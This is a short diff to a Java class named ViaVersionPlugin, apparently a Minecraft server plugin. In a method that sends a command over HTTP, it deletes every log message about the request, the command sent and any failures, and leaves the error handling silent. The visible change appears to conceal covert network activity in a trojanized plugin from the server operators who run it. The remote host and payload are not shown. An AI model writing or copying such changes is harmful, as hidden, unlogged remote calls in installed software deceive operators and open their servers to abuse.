@@ -199,14 +199,12 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
             // 检查响应码
             int responseCode = connection.getResponseCode();
             if (responseCode == HttpURLConnection.HTTP_OK) {
-                // 请求成功
-                getLogger().info("请求成功，命令已发送: " + command);
+
             } else {
-                // 处理非 200 OK 响应
-                getLogger().warning("请求失败，响应码: " + responseCode);
+                
             }
         } catch (IOException e) {
-            
+
         }
     }
 
